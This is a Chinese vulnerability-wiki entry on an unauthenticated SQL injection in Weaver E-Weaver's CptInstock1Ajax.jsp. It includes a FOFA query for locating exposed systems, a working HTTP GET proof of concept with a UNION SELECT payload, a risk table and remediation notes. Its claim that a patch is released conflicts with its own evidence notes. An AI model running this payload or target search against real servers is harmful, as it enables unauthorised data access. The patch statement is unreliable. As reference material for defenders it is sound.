---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "泛微e-weaver（文中声称） CptInstock1Ajax.jsp SQL注入"
product: "泛微e-weaver（文中声称）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无具体版本；UNION数字样本"
prerequisites: "声称未授权"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE-E-Weaver%20CptInstock1Ajax%20%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"泛微-E-Weaver\""
id: "vw-214e9bdb6da217c0caf9061c"
entity_id: "ve-214e9bdb6da217c0caf9061c"
schema_version: "1"
---

# 泛微e-weaver（文中声称） CptInstock1Ajax.jsp SQL注入

## 条目说明

- 对象与具体问题：泛微e-weaver（文中声称）；CptInstock1Ajax.jsp SQL注入
- 版本、配置及部署条件：无具体版本；UNION数字样本
- 认证与权限前提：声称未授权
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- E-Weaver与e-cology产品归属需按端点/来源核对，不能凭路径印象自动改
- 请求未围栏，结果只有图片；在野利用已知和已发布补丁无具体公告
- 标题应保留接口并标准化产品大小写

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

由于泛微E-Weaver未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限等。

## 影响版本

泛微-E-Weaver

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="泛微-E-Weaver"

POC/EXP：

```http
GET /cpt/capital/CptInstock1Ajax.jsp?id=-1+union+all+select+123456,1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```


![image-20241010112543241](./.resource/泛微-E-WeaverCptInstock1Ajax存在SQL注入漏洞/media/image-20241010112543241.png)


![image-20241010112642978](./.resource/泛微-E-WeaverCptInstock1Ajax存在SQL注入漏洞/media/image-20241010112642978.png)


## 修复方案

临时缓解方案

限制访问来源地址，如非必要，不要将系统开放在互联网上。

升级修复方案

目前官方已发布安全补丁，建议受影响用户尽快升级至安全版本

https://www.weaver.com.cn/


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
